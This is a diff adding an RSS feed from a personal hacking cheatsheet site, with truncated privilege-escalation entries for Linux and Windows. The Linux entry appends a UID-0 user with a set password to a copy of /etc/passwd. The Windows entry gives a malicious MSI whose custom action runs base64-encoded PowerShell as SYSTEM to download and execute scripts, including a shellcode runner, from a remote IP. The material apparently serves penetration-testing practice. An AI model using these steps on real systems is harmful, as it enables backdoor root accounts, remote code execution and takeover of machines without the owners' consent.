@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Privilege Escalation on Ceso Adventures</title><link>https://ceso.github.io/cheatsheets/hacking/privilege_escalation/</link><description>Recent content in Privilege Escalation on Ceso Adventures</description><generator>Hugo</generator><language>en-gb</language><lastBuildDate>Fri, 03 Oct 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/cheatsheets/hacking/privilege_escalation/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux</title><link>https://ceso.github.io/cheatsheets/hacking/privilege_escalation/linux/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/privilege_escalation/linux/</guid><description>&lt;h1 id="homeuseropenssl-ep-empty-capabilities"&gt;/home/user/openssl =ep (empty capabilities)&lt;/h1&gt;
+&lt;p&gt;Make 2 copies of passwd, one as backup of the original, and one that will be used as custom:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cp /etc/passwd /tmp/passwd.orig
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cp /etc/passwd /tmp/passwd.custom
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, a custom user will be created and added to &lt;code&gt;/tmp/passwd.custom&lt;/code&gt; with &lt;code&gt;customPassword&lt;/code&gt; and as root user (UID = GID = 0):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;echo &amp;#39;ceso:&amp;#39;&amp;#34;$( openssl passwd -6 -salt xyz customPassword )&amp;#34;&amp;#39;:0:0::/tmp:/bin/bash&amp;#39; &amp;gt;&amp;gt; /tmp/passwd.custom
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, create a custom &lt;code&gt;key.pem&lt;/code&gt; and &lt;code&gt;cert.pem&lt;/code&gt; with openssl:&lt;/p&gt;</description></item><item><title>Windows</title><link>https://ceso.github.io/cheatsheets/hacking/privilege_escalation/windows/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/privilege_escalation/windows/</guid><description>&lt;h1 id="always-install-elevated"&gt;Always Install Elevated&lt;/h1&gt;
+&lt;p&gt;If we have enabled a privilege which allow us to ALWAYS install with elevated privileges, we can craft a .msi leveranging wixt
+ools, specifically with candl.exe and light.exe.
+The steps are as follows:&lt;/p&gt;
+&lt;p&gt;1 - Create a malicious .xml wix file:&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code class="language-texinfo" data-lang="texinfo"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
+&amp;lt;Wix xmlns=&amp;#34;http://schemas.microsoft.com/wix/2006/wi&amp;#34;&amp;gt;
+ &amp;lt;Product Id=&amp;#34;*&amp;#34; UpgradeCode=&amp;#34;12345678-1234-1234-1234-111111111111&amp;#34; Name=&amp;#34;Example Product Name&amp;#34; Version=&amp;#34;0.0.1&amp;#34; Manufacture
+r=&amp;#34;@_xpn_&amp;#34; Language=&amp;#34;1033&amp;#34;&amp;gt;
+ &amp;lt;Package InstallerVersion=&amp;#34;200&amp;#34; Compressed=&amp;#34;yes&amp;#34; Comments=&amp;#34;Windows Installer Package&amp;#34;/&amp;gt;
+ &amp;lt;Media Id=&amp;#34;1&amp;#34; Cabinet=&amp;#34;product.cab&amp;#34; EmbedCab=&amp;#34;yes&amp;#34;/&amp;gt;
+ &amp;lt;Directory Id=&amp;#34;TARGETDIR&amp;#34; Name=&amp;#34;SourceDir&amp;#34;&amp;gt;
+ &amp;lt;Directory Id=&amp;#34;ProgramFilesFolder&amp;#34;&amp;gt;
+ &amp;lt;Directory Id=&amp;#34;INSTALLLOCATION&amp;#34; Name=&amp;#34;Example&amp;#34;&amp;gt;
+ &amp;lt;Component Id=&amp;#34;ApplicationFiles&amp;#34; Guid=&amp;#34;12345678-1234-1234-1234-222222222222&amp;#34;&amp;gt;
+ &amp;lt;/Component&amp;gt;
+ &amp;lt;/Directory&amp;gt;
+ &amp;lt;/Directory&amp;gt;
+ &amp;lt;/Directory&amp;gt;
+ &amp;lt;Feature Id=&amp;#34;DefaultFeature&amp;#34; Level=&amp;#34;1&amp;#34;&amp;gt;
+ &amp;lt;ComponentRef Id=&amp;#34;ApplicationFiles&amp;#34;/&amp;gt;
+ &amp;lt;/Feature&amp;gt;
+ &amp;lt;CustomAction Id=&amp;#34;SystemShell&amp;#34; Directory=&amp;#34;TARGETDIR&amp;#34; ExeCommand=&amp;#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell
+.exe -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAC
+gAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA5ADIALwBuAGkAZQByAGkALgBwAHMAMQAnACkAOwBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBj
+AHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOA
+AuADQAOQAuADkAMgAvAHIAdQBuAC0AcwBoAGUAbABsAGMAbwBkAGUALQA2ADQAYgBpAHQALgBwAHMAMQAtAGYAcgBvAG0AOQAyAC0AOAAwADgAMQBwAG8AcgB0ACcA
+KQAKAA==&amp;#34; Execute=&amp;#34;deferred&amp;#34; Impersonate=&amp;#34;no&amp;#34; Return=&amp;#34;ignore&amp;#34;/&amp;gt;
+ &amp;lt;InstallExecuteSequence&amp;gt;
+ &amp;lt;Custom Action=&amp;#34;SystemShell&amp;#34; After=&amp;#34;InstallInitialize&amp;#34;&amp;gt;&amp;lt;/Custom&amp;gt;
+ &amp;lt;/InstallExecuteSequence&amp;gt;
+ &amp;lt;/Product&amp;gt;
+&amp;lt;/Wix&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The powershell in b64 executed is this one:&lt;/p&gt;</description></item></channel></rss>
